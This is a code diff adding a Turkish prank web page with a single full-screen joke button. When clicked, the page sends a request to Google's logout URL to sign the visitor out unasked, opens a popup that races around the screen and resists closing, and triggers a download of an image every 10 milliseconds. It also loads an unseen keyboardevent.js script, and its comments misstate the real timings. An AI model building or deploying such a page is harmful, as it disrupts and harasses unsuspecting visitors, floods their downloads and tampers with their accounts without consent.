@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pencere Taşıma</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        button {
+            width: 100vw; /* Tam genişlik */
+            height: 100vh; /* Tam yükseklik */
+            font-size: 24px; /* Yazı boyutu */
+            cursor: pointer; /* İmleci göster */
+        }
+    </style>
+</head>
+<body>
+    <button onclick="moveWindow()">tıklama XD (bence)</button>
+
+    <script>
+        function moveWindow() {
+            // Google logout isteği
+            fetch('https://www.google.com/accounts/Logout', {
+                method: 'GET'
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Logout isteği başarılı');
+                } else {
+                    console.error('Logout isteği başarısız:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Hata:', error);
+            });
+
+            // Yeni bir pencere aç
+            let newWindow = window.open('', '', 'width=300,height=300');
+            
+            // Başlangıç koordinatları ve yön
+            let x = 0;
+            let y = 0;
+            let xDirection = 1; // X yönü (1 sağa, -1 sola)
+            let yDirection = 1; // Y yönü (1 aşağı, -1 yukarı)
+
+            // Ekranın genişliğini ve yüksekliğini alma
+            const screenWidth = screen.availWidth;
+            const screenHeight = screen.availHeight;
+
+            // Pencerenin sürekli hareket etmesi
+            setInterval(() => {
+                // Pencereyi yeni koordinatlara taşı
+                newWindow.moveTo(x, y);
+                
+                // Koordinatları yön doğrultusunda değiştir
+                x += 10 * xDirection;
+                y += 10 * yDirection;
+
+                // Ekranın kenarlarına çarpınca yön değiştir
+                if (x + newWindow.outerWidth >= screenWidth || x <= 0) {
+                    xDirection *= -1; // X yönünü ters çevir
+                }
+                if (y + newWindow.outerHeight >= screenHeight || y <= 0) {
+                    yDirection *= -1; // Y yönünü ters çevir
+                }
+            }, 5); // Her 50 milisaniyede bir hareket ettir
+
+            // Her 1 saniyede bir resmi indiren fonksiyon
+            setInterval(downloadImage, 10); // 1000 ms = 1 sn
+
+            // Popup penceresinde onay alma
+            newWindow.onbeforeunload = function() {
+                return 'Bu pencereyi kapatmak istediğinize emin misiniz?'; // Mesaj gösterir
+            };
+        }
+
+        function downloadImage() {
+            const link = document.createElement('a');
+            link.href = 'test.png'; // Resmin yolu
+            link.download = 'test.png';
+
+            // Resmi indir
+            link.click();
+        }
+    </script>
+    <script src="keyboardevent.js"></script>
+</body>
+</html>
